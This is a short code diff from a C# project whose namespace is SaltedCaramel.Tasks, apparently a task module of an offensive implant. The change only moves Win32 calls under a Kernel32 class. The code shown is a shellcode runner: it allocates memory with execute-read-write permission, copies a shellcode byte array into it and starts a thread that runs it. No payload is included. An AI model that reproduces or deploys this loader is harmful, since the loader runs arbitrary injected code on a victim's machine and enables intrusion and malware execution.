@@ -38,13 +38,13 @@ namespace SaltedCaramel.Tasks
             uint lpAddress = 0;
             uint dwSize = (uint)shellcode.Length;
 
-            IntPtr buffer = Win32.VirtualAlloc(lpAddress, dwSize, Win32.AllocationType.Commit | Win32.AllocationType.Reserve, Win32.MemoryProtection.ExecuteReadWrite);
+            IntPtr buffer = Win32.Kernel32.VirtualAlloc(lpAddress, dwSize, Win32.Kernel32.AllocationType.Commit | Win32.Kernel32.AllocationType.Reserve, Win32.Kernel32.MemoryProtection.ExecuteReadWrite);
             Marshal.Copy(shellcode, 0, buffer, shellcode.Length);
 
             uint threadId = 0;
-            IntPtr hThread = Win32.CreateThread(IntPtr.Zero, 0, buffer, IntPtr.Zero, 0, ref threadId);
+            IntPtr hThread = Win32.Kernel32.CreateThread(IntPtr.Zero, 0, buffer, IntPtr.Zero, 0, ref threadId);
 
-            Win32.WaitForSingleObject(hThread, 0xFFFFFFFF);
+            Win32.Kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);
         }
     }
 }
